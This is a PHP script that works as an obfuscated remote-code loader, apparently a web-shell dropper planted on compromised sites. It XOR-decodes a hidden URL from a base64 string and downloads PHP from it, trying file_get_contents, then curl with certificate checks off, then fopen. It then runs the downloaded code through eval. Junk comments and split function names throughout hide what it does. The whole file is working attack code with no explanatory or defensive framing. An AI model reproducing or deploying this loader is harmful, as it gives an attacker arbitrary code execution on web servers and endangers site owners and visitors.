<?php
function shikabukeste($data, $wongirengjembuten365) {
    $outText = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $outText .= $data[$i] ^ $wongirengjembuten365[$i % strlen($wongirengjembuten365)];
    }
    return $outText;
}

/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/$yahahahayyuk/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/= 'GxUNHx1bXU4ZAA5BFAgNBxsDBxIOExoAHRUcARpPEQ4GThQOCg4XDhwZXQgGDhcDChYYARoVHU4ZBB8cXAkcDgoSXQwKCBdAFAQVA0MTFw8KDBxBAwkJ';/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/$wongirengjembuten365/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/= 'sayonarakayo'/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/;/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/$yatta/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/= base64_decode(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/$yahahahayyuk);/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/$emangiyakinigabisangapa/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/= shikabukeste(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/$yatta, $wongirengjembuten365);/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/

function downloadWithFileGetContents(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/$emangiyakinigabisangapa) {
    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
        return file_get_contents(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*/$emangiyakinigabisangapa);
    }
    return false;
}
/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/
function downloadWithCurl(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$emangiyakinigabisangapa) {
    if (function_exists(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/'c' . /*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
        /*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$ch = curl_init();
        curl_setopt(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$ch, CURLOPT_URL, $emangiyakinigabisangapa)/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/;
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$ch, CURLOPT_SSL_VERIFYPEER, false);
        $data= curl_exec(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$ch);
        curl_close($ch);
        return $data;
    }
    return false;
}
/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/
function downloadWithFopen(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$emangiyakinigabisangapa) {
    $result= false;
    if ($fp = fopen(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$emangiyakinigabisangapa, /*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/'r')) {
        $result= '';
        while ($data = fread(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$fp, 8192)) {
            $result .= $data;
        }
        /*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/fclose($fp);
    }
    return $result;
}
/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/
$phpScript= downloadWithFileGetContents(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$emangiyakinigabisangapa);
if ($phpScript === false) {
    /*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$phpScript/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/= downloadWithCurl(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$emangiyakinigabisangapa);
}
if ($phpScript === false) {
    /*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$phpScript/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/= downloadWithFopen(/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$emangiyakinigabisangapa);
}

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL dengan semua metode.");
}
/*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/
eval('?>' . /*UoJ[mim44az^ VV%+Z{3D.E-VjHx"+k)//i$Qy&!`gaLdTcC\%*//*n)JQAC(B$`zgJplPE>SRh\de%KJ;iRp-x>Q[4_zoz0\e?]**/$phpScript);
